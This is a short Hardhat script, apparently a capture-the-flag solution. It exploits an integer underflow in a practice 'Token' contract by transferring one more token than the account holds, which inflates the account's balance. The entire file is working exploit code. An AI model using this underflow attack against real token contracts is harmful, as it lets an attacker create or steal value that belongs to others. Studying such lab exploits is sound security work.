const hre = require("hardhat");

async function main() {
  const [owner, otherAccount] = await ethers.getSigners();
  const TokenContract = await hre.ethers.getContractFactory("Token");
  // attach your instance address
  const Instance = "0x62087666e677473766C4305B0C2FA6D79b37c7E7";
  const Token = TokenContract.connect(otherAccount).attach(Instance);
  const balance = await Token.balanceOf(otherAccount.address);
  // It will cause the uint256 overflow -> which result in Increased Balance
  await Token.transfer(owner.address, parseInt(balance) + 1);
  const newBalance = await Token.balanceOf(otherAccount.address);
  console.log(balance, newBalance);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
